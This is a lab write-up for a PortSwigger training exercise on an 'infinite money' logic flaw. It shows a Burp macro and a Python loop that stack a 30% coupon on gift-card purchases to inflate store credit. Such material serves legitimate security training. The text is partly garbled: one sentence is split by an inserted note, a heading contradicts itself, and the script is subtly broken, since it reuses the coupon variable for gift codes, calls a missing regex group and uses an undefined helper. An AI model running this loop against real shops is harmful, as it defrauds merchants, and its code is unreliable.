# Lab 10 — Infinite money logic flaw

> **Expert** · [Official lab](https://portswigger.net/web-security/logic-flaws/infinite-money)

**Entry point:** buy $10 gift card with a 30% coupon ($7), redeem for $10

> 🔧 **Burp Community alternative:** the tool named below is Pro-only — the free replacement is described in the steps.
credit → +$3 per cycle. Automate with a Burp macro.

## Solution

1. Sign up for the newsletter → `SIGNUP30` coupon. Buy a $10 gift card,
   apply the coupon at checkout, redeem it — store credit +$3.
2. Automate: Settings → Sessions → add rule (scope: all URLs) running a
   macro of the 5-request cycle:

```
POST /cart
POST /cart/coupon        (apply SIGNUP30)
POST /cart/checkout
GET  /cart/order-confirmation?order-confirmed=true
POST /gift-card          (redeem the new code)
```

Configure the macro to extract the new `gift-card` code from the order
confirmation response (response 4) and inject it into the redeem request.
3. Send `GET /my-account` in Intruder with null payloads / continue
   indefinitely until credit ≥ $1337 (jacket price).
4. Buy the jacket — lab solved.

**Community alternative (no macros — Pro-only):** the same loop in Python
— each cycle buys a gift card with the coupon, redeems it, and carries the
new code forward:

```python
import requests, re

s = requests.Session()
base = 'https://YOUR-LAB-ID.web-security-academy.net'
s.post(f'{base}/login', data={'username': 'wiener', 'password': 'peter'})
code = '<your-SIGNUP30-code>'
while True:
    s.post(f'{base}/cart', data={'productId': '4', 'redir': 'PRODUCT', 'quantity': '1'})
    s.post(f'{base}/cart/coupon', data={'csrf': get_csrf(), 'coupon': code})
    r = s.post(f'{base}/cart/checkout', data={'csrf': get_csrf()})
    code = re.search(r'[0-9a-f]{16}', s.get(f'{base}/my-account').text).group(1)
    s.post(f'{base}/gift-card', data={'csrf': get_csrf(), 'gift-card': code})
```

(`get_csrf()` reads the fresh CSRF token from the page; stop once the credit
covers the jacket.)

## Notes

Any arbitrage loop (discount > value, refundable item) is an infinite
money printer — cap negative margins.
